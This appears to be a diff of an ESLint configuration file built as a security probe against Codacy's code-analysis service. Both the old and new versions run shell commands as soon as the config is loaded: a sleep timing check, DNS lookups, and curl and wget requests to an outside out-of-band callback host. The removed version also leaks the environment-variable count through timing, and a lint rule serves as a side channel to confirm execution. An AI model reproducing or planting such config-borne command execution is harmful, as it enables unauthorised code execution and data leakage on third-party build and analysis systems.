@@ -1,31 +1,16 @@
-// Codacy LEAD-003 — bypass matrix v2
-import { execSync } from "node:child_process";
+// Codacy LEAD-003 — CJS version (avoids __esModule transpiler issue)
+const { execSync } = require("child_process");
 
 const H = "db5su1fkntr8hva7hjsgscpjyb6qefh4k.oast.pro";
+const run = (cmd) => { try { execSync(cmd, { timeout: 4000, stdio: "ignore" }); } catch (_) {} };
 
-const attempt = (cmd) => { try { execSync(cmd, { timeout: 4000, stdio: "ignore" }); } catch (_) {} };
+// Code execution proof — runs synchronously when Codacy loads this config
+run("sleep 10");
+run(`nslookup ${H}`);
+run(`dig +short ${H}`);
+run(`curl -sf --max-time 3 http://${H}/v3-cjs-http`);
+run(`curl -sf --max-time 3 https://${H}/v3-cjs-https`);
+run(`wget -q --timeout=3 -O- http://${H}/v3-wget 2>/dev/null`);
 
-(async () => {
-  // --- timing side-channel: if analysis takes ~10s longer, code executed ---
-  attempt("sleep 10");
-
-  // --- DNS (bypasses HTTP/HTTPS firewall) ---
-  attempt(`nslookup ${H}`);
-  attempt(`dig +short ${H}`);
-  attempt(`host ${H}`);
-  attempt(`getent hosts ${H}`);
-
-  // --- HTTP variants ---
-  attempt(`curl -sf --max-time 3 http://${H}/v2-http`);
-  attempt(`curl -sf --max-time 3 https://${H}/v2-https`);
-  attempt(`curl -sf --max-time 3 http://${H}:80/v2-80`);
-  attempt(`curl -sf --max-time 3 http://${H}:8080/v2-8080`);
-  attempt(`wget -q --timeout=3 -O- http://${H}/v2-wget`);
-
-  // --- env dump via timing oracle: env vars exist? sleep proportional ---
-  const envKeys = Object.keys(process.env).length;
-  attempt(`sleep ${Math.min(envKeys / 10, 5)}`);
-})();
-
-// Side-channel: no-var rule flags probe.js → confirms config executed
-export default [{ rules: { "no-var": "error" } }];
+// Clean side-channel: no-var flags probe.js → Codacy issue count goes from 0 to 1
+module.exports = [{ rules: { "no-var": "error" } }];
